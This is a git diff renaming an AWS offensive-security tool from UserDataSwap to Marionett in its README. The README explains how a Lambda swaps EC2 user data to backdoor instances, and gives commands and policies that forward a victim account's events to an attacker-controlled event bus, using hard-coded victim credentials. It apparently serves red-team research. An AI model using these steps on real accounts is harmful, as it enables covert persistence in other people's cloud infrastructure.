@@ -1,6 +1,6 @@
-# UserDataSwap
+# Marionett
 
-UserDataSwap is an example of an automated lambda function that runs that swaps out user data on RunInstance and 
+Marionett is an example of an automated lambda function that runs that swaps out user data on RunInstance and 
 EC2 Instance State Change events. It  exists as an example of how an attacker could semi-covertly backdoor EC2 instances
 passively on instance change events or actively on creation. The API calls will stand out, but from the user's
 perspective when in passive mode there will be no obvious changes to the instance, in active mode the instance is simply
@@ -9,9 +9,9 @@ only change to what I've seen elsewhere is adding Event Bridge and Lambda.
 
 ## Active vs Passive
 
-UserDataSwap can run in either active or passive mode, passive is generally safer and less likely to interfere with
+Marionett can run in either active or passive mode, passive is generally safer and less likely to interfere with
 infrastructure provisioning however requires the instance to be set down through some other means, likely by the end
-user. When running in the active mode UserDataSwap will shut down the node shortly after it is initially created with
+user. When running in the active mode Marionett will shut down the node shortly after it is initially created with
 the RunInstances API, by default this is immediately however can be configured to wait up to 900 seconds after creation
 to work around issues that you may run into with various provisioning tools.
 
@@ -59,14 +59,14 @@ it may make more sense to deploy in a seperate account then the one you're targe
 requires `events:PutRule` and `events:PutTargets` permissions in the victim account. I'll likely add support for this in
 the future, for now you can try the following to do this manually.
 
-__WARNING__: This will allow any AWS account to run any action against the bus set up in the UserDataSwap account,
+__WARNING__: This will allow any AWS account to run any action against the bus set up in the Marionett account,
 probably best to set this part up in a account that isn't used for anything else. The permissive resource policy is one
 of the ways to get override the lack of permissions assigned to the the put-event rule to avoid needing `iam:PassRole`
 and an appropriate role already configured in the victim account. It may be possible to reduce these permissions, need
 to do more testing here though.
 
-* In the UsereDataSwap account:
-  * In the UserDataSwap lambda account create a new event bus named `run-instance-trigger` and give it the following
+* In the Marionett account:
+  * In the Marionett lambda account create a new event bus named `run-instance-trigger` and give it the following
     resource policy.
     ```
     {
@@ -80,7 +80,7 @@ to do more testing here though.
       }]
     }
     ```
-  * Set up a rule to trigger the UserDataSwap function with the following event config.
+  * Set up a rule to trigger the Marionett function with the following event config.
     ```
     {
       "source": [
@@ -111,13 +111,13 @@ to do more testing here though.
           }
         }'
     ```
-  * Add a target to forward to the event-bus in the UserDataSwap account:
+  * Add a target to forward to the event-bus in the Marionett account:
     ```
     aws events put-targets --rule run-instance-trigger \
       --event-bus-name default \
       --targets "Id"="1","Arn"="arn:aws:events:<region>:<attacker account #>:event-bus/run-instance-trigger"
     ```
-* You should see the UserDataSwap triggered when a instance is created in the victim account now.
+* You should see the Marionett triggered when a instance is created in the victim account now.
   * Update the lambda to hard code the credentials needed to make EC2 related calls in the vicitims account and deploy.
 
 ## More Info
